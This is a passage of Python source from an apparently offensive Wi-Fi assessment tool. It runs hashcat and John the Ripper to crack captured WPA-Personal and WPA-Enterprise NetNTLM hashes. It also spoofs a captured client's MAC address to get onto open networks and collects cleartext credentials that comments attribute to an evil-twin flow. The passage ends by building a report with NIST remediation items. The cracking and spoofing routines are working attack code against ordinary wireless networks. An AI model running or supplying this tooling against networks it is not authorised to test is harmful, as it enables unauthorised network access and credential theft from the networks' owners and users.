    _watch_stop = threading.Event()
    def _watch_recovered():
        time.sleep(0.3)
        while not _watch_stop.is_set():
            try:
                if os.path.exists(recovered) and os.path.getsize(recovered) > 0:
                    p = proc_holder.get("proc")
                    if p and p.poll() is None:
                        print(f"\n       {RDY}passphrase recovered · stopping hashcat{R}")
                        try: p.send_signal(signal.SIGINT)
                        except Exception: pass
                    time.sleep(0.5)
                    _watch_stop.set()
                    return
            except Exception:
                pass
            time.sleep(0.3)

    threading.Thread(target=_watch_recovered, daemon=True).start()

    old_handler[0] = signal.signal(signal.SIGINT, _sigint)
    try:
        proc = subprocess.Popen(cmd)
        proc_holder["proc"] = proc
        proc.wait()
    except Exception:
        pass
    finally:
        _watch_stop.set()
        signal.signal(signal.SIGINT, old_handler[0])

    if os.path.exists(recovered) and os.path.getsize(recovered) > 0:
        print()
        print(" DONE: passphrase recovered")
        print()
        for line in open(recovered):
            print(f" {line.strip()}")
        print()
        time.sleep(1.0)
        return

    print()
    print(" WARNING: passphrase not recovered")
    print()
    time.sleep(1.0)

def run_wpa_enterprise_hashcat():
    folder, _ = load_target()
    if not folder:
        return
    hashfile  = f"{folder}/hashes_hc5500.txt"
    recovered = f"{hashfile}.recovered"
    if not os.path.exists(hashfile):
        return
    try: os.remove(recovered)
    except Exception: pass

    strategy = _recovery_prompt_strategy(method="hashcat -m 5500")
    if not strategy:
        return False   # user cancelled from strategy menu

    restore(); clear()
    print("=" * 60)
    print(" WPA ENTERPRISE - CREDENTIAL RECOVERY")
    print("=" * 60)
    print()
    print(f" Hash : {hashfile}")
    print()

    kind, source = strategy
    safe_flags = _hashcat_safe_flags(5500)
    if safe_flags:
        print(f" {DIM}device: CPU only — Intel iGPU detected, avoiding silent skip{R}")
    if kind == "WORDLIST":
        cmd = ["hashcat", "-m", "5500", hashfile, source,
               "-w", "4", "-o", recovered, "--potfile-disable"] + safe_flags
        print(f" Wordlist : {source}")
    else:
        cmd = ["hashcat", "-m", "5500", hashfile, "-a", "3", source,
               "-w", "4", "-o", recovered, "--potfile-disable"] + safe_flags
        print(f" Mask     : {source}")
    print()
    print(f" {DIM}fresh run · potfile disabled · stops at first crack{R}")
    print()
    print(" Running hashcat -m 5500 ...")
    print()
    sys.stdout.flush()

    proc_holder = {"proc": None}
    old_handler = [None]
    def _sigint(s, f):
        p = proc_holder.get("proc")
        if p is None:
            signal.signal(signal.SIGINT, old_handler[0])
            raise KeyboardInterrupt
        if p.poll() is None:
            try: p.send_signal(signal.SIGINT)
            except Exception: pass

    _watch_stop = threading.Event()
    def _watch_recovered():
        time.sleep(0.3)
        while not _watch_stop.is_set():
            try:
                if os.path.exists(recovered) and os.path.getsize(recovered) > 0:
                    p = proc_holder.get("proc")
                    if p and p.poll() is None:
                        print(f"\n       {RDY}credential recovered · stopping hashcat{R}")
                        try: p.send_signal(signal.SIGINT)
                        except Exception: pass
                    time.sleep(0.5)
                    _watch_stop.set()
                    return
            except Exception:
                pass
            time.sleep(0.3)

    threading.Thread(target=_watch_recovered, daemon=True).start()

    old_handler[0] = signal.signal(signal.SIGINT, _sigint)
    try:
        proc = subprocess.Popen(cmd)
        proc_holder["proc"] = proc
        proc.wait()
    except Exception:
        pass
    finally:
        _watch_stop.set()
        signal.signal(signal.SIGINT, old_handler[0])

    if os.path.exists(recovered) and os.path.getsize(recovered) > 0:
        print()
        print(" DONE: credentials recovered")
        print()
        for line in open(recovered):
            print(f" {line.strip()}")
        print()
        time.sleep(1.0)
        return

    print()
    print(" WARNING: credentials not recovered")
    print()
    time.sleep(1.0)

def run_wpa_enterprise_jtr():
    folder, _ = load_target()
    if not folder:
        return
    hashfile  = f"{folder}/hashes_jtr.txt"
    recovered = f"{hashfile}.recovered"
    if not os.path.exists(hashfile):
        return

    strategy = _recovery_prompt_strategy(method="john netntlm")
    if not strategy:
        return False   # user cancelled from strategy menu

    pot = f"/tmp/wsa_john_{os.getpid()}_{int(time.time())}.pot"
    try: os.remove(pot)
    except Exception: pass
    try: os.remove(recovered)
    except Exception: pass

    restore(); clear()
    print("=" * 60)
    print(" WPA ENTERPRISE - CREDENTIAL RECOVERY (JOHN)")
    print("=" * 60)
    print()
    print(f" Hash : {hashfile}")
    print()

    kind, source = strategy
    if kind == "WORDLIST":
        cmd = ["john", "--format=netntlm", f"--wordlist={source}",
               f"--pot={pot}", hashfile]
        print(f" Wordlist : {source}")
    else:
        cmd = ["john", "--format=netntlm", f"--mask={source}",
               f"--pot={pot}", hashfile]
        print(f" Mask     : {source}")
    print()
    print(f" {DIM}fresh run · isolated pot · stops at first crack{R}")
    print()
    print(" Running john --format=netntlm ...")
    print()
    sys.stdout.flush()

    proc_holder = {"proc": None}
    old_handler = [None]
    def _sigint(s, f):
        p = proc_holder.get("proc")
        if p is None:
            signal.signal(signal.SIGINT, old_handler[0])
            raise KeyboardInterrupt
        if p.poll() is None:
            try: p.send_signal(signal.SIGINT)
            except Exception: pass

    _watch_stop = threading.Event()
    def _watch_pot():
        time.sleep(0.5)
        while not _watch_stop.is_set():
            try:
                if os.path.exists(pot) and os.path.getsize(pot) > 0:
                    p = proc_holder.get("proc")
                    if p and p.poll() is None:
                        print(f"\n       {RDY}credential recovered · stopping john{R}")
                        try: p.send_signal(signal.SIGINT)
                        except Exception: pass
                    time.sleep(0.5)
                    _watch_stop.set()
                    return
            except Exception:
                pass
            time.sleep(0.5)

    threading.Thread(target=_watch_pot, daemon=True).start()

    old_handler[0] = signal.signal(signal.SIGINT, _sigint)
    try:
        proc = subprocess.Popen(cmd)
        proc_holder["proc"] = proc
        proc.wait()
    except Exception:
        pass
    finally:
        _watch_stop.set()
        signal.signal(signal.SIGINT, old_handler[0])

    # parse pot directly — fresh run, no history contamination
    recovered_lines = []
    if os.path.exists(pot):
        try:
            with open(pot, errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line:
                        recovered_lines.append(line)
        except Exception:
            pass
    try: os.remove(pot)
    except Exception: pass

    if recovered_lines:
        with open(recovered, "w") as f:
            f.write("\n".join(recovered_lines) + "\n")
        print()
        print(" DONE: credentials recovered")
        print()
        for line in recovered_lines:
            print(f" {line}")
        print()
        time.sleep(1.0)
        return

    print()
    print(" WARNING: credentials not recovered")
    print()
    time.sleep(1.0)

def run_mac_spoof_once():
    folder, info = load_target()
    if not folder:
        return
    bssid = info.get("bssid", "")
    stations = load_stations(folder, bssid)
    if not stations:
        restore(); clear()
        print()
        print(f"       {WHT}no station in capture{R}")
        print()
        input(" press ENTER to return ")
        return

    mac = stations[0]
    iface = SPOOF()
    restore(); clear()
    print(); print()
    print(rule("spoof mac"))
    print(row("adapter", iface, WHT))
    print(row("target",  mac,   WHT))
    print()

    save_station(folder, mac)
    write_nm_dropin(mac)

    _run_sudo("systemctl", "restart", "NetworkManager")
    time.sleep(4)
    _run_sudo("nmcli", "dev", "set", iface, "managed", "yes")
    time.sleep(2)

    _run_sudo("ip", "link", "set", iface, "down")
    _run_sudo("ip", "link", "set", iface, "address", mac)
    _run_sudo("ip", "link", "set", iface, "up")
    time.sleep(3)

    applied = current_mac(iface) == mac.upper()
    print()
    if applied:
        print(f"  {RDY}DONE{R}  {WHT}MAC spoof applied{R}")
    else:
        print(f"  {VAL}WARN{R}  {WHT}not confirmed{R}")
    print(row("current", current_mac(iface) or "(not found)", WHT))
    print()
    input(" press ENTER to return ")

def run_reset_mac_adapter():
    iface = SPOOF()
    restore(); clear()
    print(); print()
    print(rule("reset mac adapter"))
    print()
    write_nm_dropin("permanent")
    hw = original_mac(iface)
    if hw:
        _run_sudo("ip", "link", "set", iface, "down")
        _run_sudo("ip", "link", "set", iface, "address", hw)
        _run_sudo("ip", "link", "set", iface, "up")
    _run_sudo("systemctl", "restart", "NetworkManager")
    _run_sudo("nmcli", "dev", "set", iface, "managed", "yes")
    time.sleep(3)
    print(f"  {RDY}DONE{R}  {WHT}{iface} reset{R}")
    print(row("current", current_mac(iface) or "(not found)", WHT))
    print()
    input(" press ENTER to return ")

def _analysis_read_target(folder):
    info = {}
    tf = f"{folder}/target_info.txt"
    if not os.path.exists(tf):
        return info
    for line in open(tf):
        if ":" in line:
            k, v = line.split(":", 1)
            info[k.strip().lower()] = v.strip()
    return info

def _analysis_classify(info):
    priv = info.get("privacy", "").upper()
    auth = info.get("authentication", "").upper()
    if "OPN" in priv:                  return "OPEN"
    if "WEP" in priv:                  return "WEP"
    if "MGT" in auth or "EAP" in auth: return "WPA-ENTERPRISE"
    if "SAE" in auth:                  return "WPA3"
    return "WPA-PERSONAL"

def _analysis_auto_extract(key, folder):
    with open(CURRENT_FILE, "w") as f:
        f.write(folder)
    if key in ("WPA-PERSONAL", "WPA3"):
        extract_mana_personal()
    elif key == "WPA-ENTERPRISE":
        extract_mana_enterprise()

def _analysis_ensure_report(folder):
    with open(CURRENT_FILE, "w") as f:
        f.write(folder)
    generate_report()
    set_pane_title("ANALYSIS")

def _analysis_show_card(folder, elapsed, key):
    """Show the classified result card after analysis recovery.
    Always red (per spec).  Enter dismisses card → back to analysis menu."""
    info = _analysis_read_target(folder)
    profile = _nist_profile(info)
    essid = info.get("essid", "?")
    bssid = info.get("bssid", "?")
    findings = _report_collect_findings(folder, profile)
    if findings:
        f = findings[0]
        fields = []
        if f.get("username"):
            fields.append(("username", f["username"]))
        if f.get("passphrase"):
            label = "password" if profile == "ENTERPRISE" else "passphrase"
            fields.append((label, f["passphrase"]))
        if f.get("key"):
            fields.append(("wep key", f["key"]))
        _display_recovery_result(
            success=True, essid=essid, bssid=bssid,
            method=f.get("method", "recovery"),
            fields=fields,
            elapsed_seconds=elapsed, force_red=True)
    else:
        method_map = {
            "WPA-PERSONAL":   "hashcat -m 22000",
            "WPA3":           "hashcat -m 22000",
            "WPA-ENTERPRISE": "hashcat / john",
            "WEP":            "aircrack-ng -a 1",
            "OPEN":           "mac spoof + ping",
        }
        fields = [("reason", "no material recovered")]
        if key == "WEP":
            # run_wep_aircrack writes WEP_IVS even on failure so the card
            # surfaces exactly how close the capture was to the threshold.
            try:
                tf_path = os.path.join(folder, "target_info.txt")
                if os.path.exists(tf_path):
                    _ivs = None
                    for _line in open(tf_path, errors="ignore"):
                        if _line.upper().startswith("WEP_IVS:"):
                            _ivs = _line.split(":", 1)[1].strip()
                            break
                    if _ivs and _ivs != "0":
                        try:
                            _n = int(_ivs)
                        except Exception:
                            _n = 0
                        if _n and _n < 20000:
                            _status = "below 20,000 - capture again"
                        elif _n:
                            _status = "below 50,000 - may not recover"
                        else:
                            _status = "unknown"
                        fields = [
                            ("ivs harvested", f"{_n:,}" if _n else _ivs),
                            ("status", _status),
                            ("threshold", ">= 50,000 for reliable recovery"),
                        ]
                    elif _ivs == "0":
                        fields = [("ivs harvested", "0 (capture too short)")]
            except Exception:
                pass
        _display_recovery_result(
            success=False, essid=essid, bssid=bssid,
            method=method_map.get(key, "recovery"),
            fields=fields,
            elapsed_seconds=elapsed, force_red=True)

def _analysis_run_verb(folder, fn, show_card=False):
    with open(CURRENT_FILE, "w") as f:
        f.write(folder)
    restore(); clear()
    print(); print()
    sys.stdout.flush()
    t0 = time.time()
    _result = None
    try:
        _result = fn()
    except KeyboardInterrupt:
        pass
    elapsed = time.time() - t0
    generate_report()
    set_pane_title("ANALYSIS")
    if show_card and _result is not False:
        # skip card when recovery returned False (user cancelled)
        info = _analysis_read_target(folder)
        key = _analysis_classify(info)
        _analysis_show_card(folder, elapsed, key)
    time.sleep(0.3)

def _display_report_coloured(path):
    """Display a plain-text report with theme colours applied live."""
    restore(); clear()
    print()
    try:
        with open(path, errors="ignore") as f:
            for raw in f:
                line = raw.rstrip("\n")
                if not line.strip():
                    print()
                    continue
                s   = line.strip()
                low = s.lower()

                if low == "end of report":
                    continue

                # section header: 2-4 leading spaces, uppercase, no colon
                if re.match(r'^\s{2,4}[A-Z][A-Z0-9 /()\-]+$',
                            line) and ":" not in line:
                    print(rule(s))
                    continue

                print(f"{WHT}{line}{R}")
    except Exception:
        pass
    print()
    sys.stdout.flush()
    try:
        input(f"   {LBL}press ENTER to return \u25b8{R} ")
    except (KeyboardInterrupt, EOFError):
        pass

def _analysis_view_file(folder, pattern):
    matches = sorted(glob.glob(f"{folder}/{pattern}"))
    restore(); clear()
    print(); print()
    if not matches:
        print(f"       {WHT}no file matching {pattern}{R}")
        print()
        input(" press ENTER to return ")
        set_pane_title("ANALYSIS")
        return
    path = matches[0]
    try:
        size = os.path.getsize(path)
    except Exception:
        size = 0
    try:
        if os.path.basename(path).startswith("REPORT_"):
            _display_report_coloured(path)
        elif size < 6000:
            restore(); clear()
            print(); print()
            with open(path) as f:
                sys.stdout.write(f.read())
            print(); print()
            sys.stdout.flush()
            input(f"   {LBL}press ENTER to return \u25b8{R} ")
        else:
            subprocess.run(["less", "-R", path])
    except KeyboardInterrupt:
        pass
    set_pane_title("ANALYSIS")
    time.sleep(0.3)

_ANALYSIS_ARTIFACTS = [
    ("*.cap",                    "cap"),
    ("mana_hashes.hc22000",      "hc22000"),
    ("mana_hashes_all.hc22000",  "hc22000"),
    ("credentials.txt",          "creds"),
    ("hashes_jtr.txt",           "jtr"),
    ("hashes_hc5500.txt",        "hc5500"),
    ("hashcat_5500.hc",          "hashcat"),
    ("john_hashes.txt",          "jtr"),
    ("key.txt",                  "key"),
    ("*.recovered",              "recovered"),
    ("REPORT_*.txt",             "report"),
]

def _analysis_find_artifacts(folder):
    found, seen = [], set()
    for pattern, label in _ANALYSIS_ARTIFACTS:
        for f in sorted(glob.glob(f"{folder}/{pattern}")):
            if f in seen:
                continue
            seen.add(f)
            found.append((label, f))
    return found

def _analysis_phase(folder):
    if (glob.glob(os.path.join(folder, "*.recovered")) or
        glob.glob(os.path.join(folder, "key.txt"))):
        return "complete"
    if (glob.glob(os.path.join(folder, "*.hc22000")) or
        glob.glob(os.path.join(folder, "hashes_jtr.txt")) or
        glob.glob(os.path.join(folder, "hashes_hc5500.txt")) or
        glob.glob(os.path.join(folder, "hashcat_5500.hc"))):
        return "analysis"
    if (glob.glob(os.path.join(folder, "*.cap")) or
        glob.glob(os.path.join(folder, "mana_hashes.txt"))):
        return "capture"
    return "-"

def _analysis_actions(key, folder):
    def _run(fn, show_card=False):
        return lambda: _analysis_run_verb(folder, fn, show_card=show_card)
    def _view(p):    return lambda: _analysis_view_file(folder, p)

    if key == "OPEN":
        return [
            ("view report",           _view("REPORT_*.txt")),
            ("spoof mac  (from csv)", _run(run_mac_spoof_once)),
            ("reset mac",             _run(run_reset_mac_adapter)),
        ]
    if key == "WEP":
        return [
            ("recover WEP key  (aircrack-ng)", _run(run_wep_aircrack, show_card=True)),
            ("view key",                       _view("key.txt")),
            ("view report",                    _view("REPORT_*.txt")),
        ]
    if key in ("WPA-PERSONAL", "WPA3"):
        return [
            ("recover passphrase  (hashcat -m 22000)",
             _run(run_wpa_personal_hashcat, show_card=True)),
            ("view recovered",  _view("*.recovered")),
            ("view report",     _view("REPORT_*.txt")),
        ]
    if key == "WPA-ENTERPRISE":
        return [
            ("recover credentials  (hashcat -m 5500)",
             _run(run_wpa_enterprise_hashcat, show_card=True)),
            ("recover credentials  (john netntlm)",
             _run(run_wpa_enterprise_jtr, show_card=True)),
            ("view recovered",  _view("*.recovered")),
            ("view report",     _view("REPORT_*.txt")),
        ]
    return [("view report", _view("REPORT_*.txt"))]

def _analysis_list_targets():
    if not os.path.isdir(ASSESSMENTS_DIR):
        return []
    return sorted([d for d in os.listdir(ASSESSMENTS_DIR)
                   if os.path.isdir(os.path.join(ASSESSMENTS_DIR, d))])

def _analysis_draw_target_list(targets):
    restore(); clear()
    standard_header()
    print()
    print(rule("options"))
    if not targets:
        print(f"       {WHT}(no captured targets){R}")
    else:
        print(f"       {WHT}{'#':<3}{'essid':<24}{'encryption':<14}"
              f"{'auth':<8}{'report'}{R}")
        for i, t in enumerate(targets, 1):
            info  = _analysis_read_target(
                os.path.join(ASSESSMENTS_DIR, t))
            priv  = info.get("privacy", "?") or "?"
            auth  = info.get("authentication", "-") or "-"
            name  = t if len(t) <= 23 else t[:20] + "..."
            phase = _analysis_phase(os.path.join(ASSESSMENTS_DIR, t)) or "-"
            print(f"       {WHT}{i:<3}{name:<24}{priv:<14}{auth:<8}{phase}{R}")
    print()
    sys.stdout.flush()

def _analysis_draw_target_menu(folder, info, key):
    restore(); clear()
    standard_header()
    artifacts = _analysis_find_artifacts(folder)
    actions   = _analysis_actions(key, folder)

    print(rule("target"))
    print(row("essid",   info.get("essid", "-"), WHT))
    print(f"       {WHT}{'bssid':<12} "
          f"{info.get('bssid', '-'):<20}|  ch {info.get('channel', '-')}{R}")
    print(row("privacy", info.get("privacy", "-"), WHT))
    print(row("auth",    info.get("authentication", "-") or "-", WHT))
    print(row("flow",    key, WHT))
    print()

    print(rule("artifacts"))
    if artifacts:
        for label, path in artifacts:
            print(f"       {WHT}{label:<12}{os.path.basename(path)}{R}")
    else:
        print(f"       {WHT}(none){R}")
    print()

    print(rule("options"))
    for i, (label, _) in enumerate(actions, 1):
        print(f"       {WHT}{i}  {label}{R}")
    print()
    sys.stdout.flush()

def run_analysis_console():
    set_pane_title("ANALYSIS")

    while True:
        targets = _analysis_list_targets()
        _analysis_draw_target_list(targets)

        if not targets:
            try:
                input(f"   {LBL}press ENTER to refresh ▸{R} ")
            except (KeyboardInterrupt, EOFError):
                continue
            continue

        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            continue

        if not choice or not choice.isdigit():
            continue

        n = int(choice)
        if n == 0:
            return
        if not (1 <= n <= len(targets)):
            continue

        folder = os.path.join(ASSESSMENTS_DIR, targets[n - 1])
        info   = _analysis_read_target(folder)
        key    = _analysis_classify(info)

        _analysis_auto_extract(key, folder)
        _analysis_ensure_report(folder)
        set_pane_title("ANALYSIS")

        while True:
            _analysis_draw_target_menu(folder, info, key)
            try:
                choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
            except (KeyboardInterrupt, EOFError):
                break

            if choice == "0":
                break
            if not choice.isdigit():
                continue

            actions = _analysis_actions(key, folder)
            m = int(choice)
            if 1 <= m <= len(actions):
                actions[m - 1][1]()
            continue

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 9 · REPORT + NIST
# ═══════════════════════════════════════════════════════════════════════════

_NIST = {
    "OPEN": [
        "SC-13   Implement WPA2/WPA3 encryption immediately",
        "SC-8    If open access required, enforce TLS at application layer",
        "SC-7    Segment the open network from internal resources",
        "AC-8    Captive portal with acceptable use policy",
        "SI-4    Deploy wireless intrusion detection (WIDS)",
    ],
    "WEP": [
        "SC-13   Remove WEP immediately, no compensating control is safe",
        "SC-12   Enforce WPA2-AES (CCMP) minimum, WPA3-SAE preferred",
        "IA-5    Eliminate shared static keys, deploy 802.1X where possible",
        "SC-7    Isolate legacy WEP devices in a dedicated VLAN with strict ACLs",
        "SI-4    Detect abnormal ARP replay and deauth patterns",
        "CM-6    Enforce WEP prohibition in the wireless baseline policy",
    ],
    "WPA_PERSONAL": [
        "IA-5    Enforce passphrase of 15 characters or more, non-dictionary",
        "SC-8    Enable PMF (802.11w) to block deauth-forced reassociation",
        "SC-13   Disable WPA2-TKIP, enforce AES-CCMP minimum",
        "IA-5(1) Passphrase lifecycle and rotation policy",
        "SC-7    Separate guest and internal SSIDs, apply inter-VLAN ACLs",
        "SI-4    Detect deauth patterns and repeated EAPOL sequences",
        "SC-13   Migrate to WPA3-SAE where device support allows",
    ],
    "WPA3": [
        "SC-13   Disable WPA2 transition mode, enforce pure WPA3-SAE",
        "SC-8    PMF Required, blocks deauth-based forced reassociation",
        "IA-5    Lock client profiles to SSID and security type",
        "SI-4    WIDS alerts on duplicate or near-duplicate SSIDs",
        "CM-6    Enforce WPA3-only baseline, audit transition mode periodically",
    ],
    "ENTERPRISE": [
        "IA-8    Enforce EAP-TLS with mutual certificate authentication",
        "SC-17   Strict server certificate validation on all clients",
        "IA-5    Disable MSCHAPv2 and TTLS-PAP, restrict EAP method list",
        "SC-7    Per-VLAN assignment via RADIUS, no lateral access",
        "SI-4    RADIUS accounting, alert on EAP failures and rogue AP events",
        "CM-6    Enforce PKI infrastructure for wireless authentication",
    ],
}

def _nist_profile(info):
    priv = info.get("privacy", "").upper()
    auth = info.get("authentication", "").upper()
    if "OPN" in priv or not priv:                            return "OPEN"
    if "WEP" in priv:                                        return "WEP"
    if "MGT" in auth or "EAP" in auth:                       return "ENTERPRISE"
    if "SAE" in auth or "WPA3" in priv or "GCMP" in priv:    return "WPA3"
    return "WPA_PERSONAL"

def _nist_remediation(info, findings):
    base = list(_NIST[_nist_profile(info)])
    if not findings:
        return base
    types = {f.get("type") for f in findings}
    priority = None
    if "PSK_PASSPHRASE" in types:
        priority = "IA-5(1) Passphrase was recovered — rotate and strengthen immediately"
    elif "ENTERPRISE_CREDENTIALS" in types or "ENTERPRISE_CREDENTIAL" in types:
        priority = "IA-5    Credential was recovered — revoke, reset, enforce EAP-TLS"
    elif "WEP_KEY" in types:
        priority = "SC-13   WEP key was recovered — decommission WEP"
    elif "IDENTITY_SPOOFED" in types:
        priority = "AC-3    Identity spoofing succeeded — enforce authentication"
    elif "MAC_CHANGED_NO_ACCESS" in types:
        priority = "AC-3    Client MAC was spoofed — verify access control at every layer"
    if priority:
        base.insert(0, priority)
    return base

def _report_read_target(folder):
    info, stations = {}, []
    tf = os.path.join(folder, "target_info.txt")
    if not os.path.exists(tf):
        return info, stations
    for line in open(tf, errors="ignore"):
        line = line.rstrip()
        if line.startswith("STATION:"):
            mac = line.split(":", 1)[1].strip()
            if mac and mac not in stations:
                stations.append(mac)
            continue
        if ":" in line:
            k, v = line.split(":", 1)
            info[k.strip().lower()] = v.strip()
    return info, stations

def _report_read_handbook(folder):
    path = os.path.join(folder, "handbook_report.json")
    if not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            return json.load(f)
    except Exception:
        return None

def _report_collect_findings(folder, profile):
    findings, seen = [], set()

    def add(f):
        key = (f.get("type", ""),
               f.get("passphrase") or f.get("key") or "")
        if key in seen:
            return
        seen.add(key)
        findings.append(f)

    hb = _report_read_handbook(folder)
    if hb:
        f = hb.get("findings") or {}
        if f.get("type") and f.get("details"):
            d = f["details"]
            add({
                "type":         f["type"],
                "passphrase":   d.get("passphrase"),
                "key":          d.get("hex_key"),
                "username":     d.get("username"),
                "method":       d.get("method", "wsa auto engine"),
                "recovered_at": f.get("recovered_at", ""),
                "source":       "handbook_report.json",
                "notes":        d.get("notes", ""),
            })

    if profile in ("WPA_PERSONAL", "WPA3"):
        for path in sorted(glob.glob(os.path.join(folder,
                                                  "*.hc22000.recovered"))):
            if not os.path.exists(path) or os.path.getsize(path) == 0:
                continue
            for line in open(path, errors="ignore"):
                line = line.strip()
                if ":" not in line:
                    continue
                passphrase = line.rsplit(":", 1)[-1].strip()
                add({
                    "type":         "PSK_PASSPHRASE",
                    "passphrase":   passphrase,
                    "method":       "hashcat -m 22000",
                    "recovered_at": time.ctime(os.path.getmtime(path)),
                    "source":       os.path.basename(path),
                })

    if profile == "ENTERPRISE":
        # hashcat -m 5500 writes hashes_hc5500.txt.recovered
        # john --format=netntlm writes hashes_jtr.txt.recovered
        # both match hashes_*.recovered
        for path in sorted(glob.glob(os.path.join(folder, "hashes_*.recovered"))):
            if not os.path.exists(path) or os.path.getsize(path) == 0:
                continue
            _is_john = "jtr" in os.path.basename(path).lower()
            for line in open(path, errors="ignore"):
                line = line.strip()
                if ":" not in line:
                    continue
                parts = line.split(":")
                # hashcat: user::::resp:chal:passphrase  -> parts[-1]
                # john:    user:passphrase[:extra]       -> parts[1]
                # netntlm pot:  user::::resp:chal:pass  →  parts[-1]
                # hashcat 5500: user::domain:resp:chal:pass → parts[-1]
                _pwd = parts[-1]
                add({
                    "type":         "ENTERPRISE_CREDENTIAL",
                    "username":     parts[0],
                    "passphrase":   _pwd,
                    "method":       "john netntlm" if _is_john else "hashcat -m 5500",
                    "recovered_at": time.ctime(os.path.getmtime(path)),
                    "source":       os.path.basename(path),
                })
        # TTLS-PAP cleartext: _evil_twin_flow wrote USERNAME/PASSWORD
        # to target_info.txt; no hash cracking was needed.
        tf = os.path.join(folder, "target_info.txt")
        if os.path.exists(tf):
            try:
                _im = {}
                for _ln in open(tf, errors="ignore"):
                    if ":" in _ln:
                        _k, _v = _ln.split(":", 1)
                        _im[_k.strip().lower()] = _v.strip()
                _u = _im.get("username", "")
                _p = _im.get("password", "")
                if _u and _p:
                    add({
                        "type":       "ENTERPRISE_CREDENTIAL",
                        "username":   _u,
                        "passphrase": _p,
                        "method":     "cleartext · TTLS-PAP",
                        "source":     "target_info.txt",
                        "recovered_at": time.ctime(os.path.getmtime(tf)),
                    })
            except Exception:
                pass

    if profile == "OPEN":
        # OPEN flow evidence lives in target_info.txt as PING_RESULT
        # (auto mode) or PING_RESULT written by manual ping console.
        # STATION records the MAC we spoofed to; PING_MAC records the
        # MAC at ping time.  Either path produces a finding.
        tf = os.path.join(folder, "target_info.txt")
        if os.path.exists(tf):
            try:
                info_map = {}
                for _line in open(tf, errors="ignore"):
                    if ":" in _line:
                        _k, _v = _line.split(":", 1)
                        info_map[_k.strip().lower()] = _v.strip()
                _ping    = info_map.get("ping_result", "").lower()
                _spoofed = info_map.get("ping_mac", "") or info_map.get("spoofed", "") or info_map.get("station", "")
                if _ping == "yes":
                    add({
                        "type":       "IDENTITY_SPOOFED",
                        "notes":      f"spoofed MAC {_spoofed or chr(40) + 'unknown' + chr(41)} reached network via ping 8.8.8.8",
                        "method":     "MAC spoof + ping verification",
                        "source":     "target_info.txt",
                        "recovered_at": time.ctime(os.path.getmtime(tf)),
                    })
                elif _spoofed:
                    add({
                        "type":       "MAC_CHANGED_NO_ACCESS",
                        "notes":      f"spoofed MAC {_spoofed} — no internet reachability observed",
                        "method":     "MAC spoof + ping verification",
                        "source":     "target_info.txt",
                        "recovered_at": time.ctime(os.path.getmtime(tf)),
                    })
            except Exception:
                pass

    if profile == "WEP":
        key_path = os.path.join(folder, "key.txt")
        if os.path.exists(key_path) and os.path.getsize(key_path) > 0:
            try:
                raw = open(key_path, errors="ignore").read().strip()
            except Exception:
                raw = ""
            # key.txt format varies: auto wrapup writes
            #   "WEP KEY: 31:32:33:34:35"
            # analysis run_wep_aircrack writes
            #   "HEX:   3132333435\nASCII: 12345"
            # Both must collapse to a single-line display value or the
            # report row alignment breaks on the embedded newline.
            _hex = ""
            _asc = ""
            if raw.upper().startswith("WEP KEY:"):
                _hex = raw.split(":", 1)[1].strip()
            else:
                for _line in raw.splitlines():
                    _lu = _line.strip().upper()
                    if _lu.startswith("HEX:"):
                        _hex = _line.split(":", 1)[1].strip()
                    elif _lu.startswith("ASCII:"):
                        _asc = _line.split(":", 1)[1].strip()
            if _hex and _asc and _asc != "(not printable)":
                key_str = f"{_hex}  (ASCII: {_asc})"
            elif _hex:
                key_str = _hex
            else:
                key_str = "  ".join(l.strip() for l in raw.splitlines() if l.strip())
            add({
                "type":         "WEP_KEY",
                "key":          key_str,
                "method":       "aircrack-ng",
                "recovered_at": time.ctime(os.path.getmtime(key_path)),
                "source":       "key.txt",
            })

    return findings

def _report_collect_evidence(folder):
    items = []
    patterns = [
        ("handshake",     "*.hc22000"),
        ("hashcat wpa",   "*.hc22000.recovered"),
        ("raw log",       "mana_hashes.txt"),
        ("enterprise",    "hashes_jtr.txt"),
        ("enterprise",    "hashes_hc5500.txt"),
        ("hashcat ent.",  "*.hc"),
        ("hashcat ent.",  "*.hc.recovered"),
        ("john hashes",   "john_hashes.txt"),
        ("wep key",       "key.txt"),
        ("report json",   "handbook_report.json"),
    ]
    seen = set()
    for label, pat in patterns:
        for path in sorted(glob.glob(os.path.join(folder, pat))):
            name = os.path.basename(path)
            if name in seen or name.startswith("REPORT_"):
                continue
            seen.add(name)
            items.append((label, name))
    return items

def _report_phase(folder, findings):
    if findings:
        return "complete"
    # any recovered file means analysis was attempted
    # (.hc22000.recovered for WPA, hashes_hc5500.txt.recovered for
    # enterprise hashcat, hashes_jtr.txt.recovered for john)
    if glob.glob(os.path.join(folder, "*.recovered")):
        return "analysis"
    return "capture"

def generate_report():
    if not os.path.exists(CURRENT_FILE):
        return None
    folder = open(CURRENT_FILE).read().strip()
    if not os.path.isdir(folder):
        return None

    info, stations = _report_read_target(folder)
    if not info:
        return None

    profile     = _nist_profile(info)
    findings    = _report_collect_findings(folder, profile)
    evidence    = _report_collect_evidence(folder)
    remediation = _nist_remediation(info, findings)
    phase       = _report_phase(folder, findings)

    essid = info.get("essid", "unknown")
    safe  = _safe_folder_name(essid)
    out   = os.path.join(folder, f"REPORT_{safe}.txt")

    L = [""]
    L.append(rule("wireless security assessment report"))
    L.append(row("date",     time.ctime()))
    L.append(row("operator", os.environ.get("SUDO_USER")
                              or os.environ.get("USER") or "unknown"))
    L.append(row("status",   phase))
    L.append(row("findings", len(findings)))
    L.append("")
    L.append(rule("target"))
    L.append(row("essid",   info.get("essid", "-")))
    L.append(row("bssid",   info.get("bssid", "-")))
    L.append(row("channel", info.get("channel", "-")))
    L.append(row("privacy", info.get("privacy", "-")))
    L.append(row("cipher",  info.get("cipher", "-") or "-"))
    L.append(row("auth",    info.get("authentication", "-") or "-"))
    L.append(row("adapter", info.get("adapter", "-")))
    L.append("")

    if stations:
        L.append(rule("stations observed"))
        for mac in stations:
            L.append(f"       {WHT}{mac}{R}")
        L.append("")

    L.append(rule("findings"))
    if findings:
        for f in findings:
            L.append(row("type", f["type"]))
            if f.get("passphrase"): L.append(row("passphrase", f["passphrase"]))
            if f.get("key"):        L.append(row("key",        f["key"]))
            if f.get("username"):   L.append(row("username",   f["username"]))
            if f.get("method"):     L.append(row("method",     f["method"]))
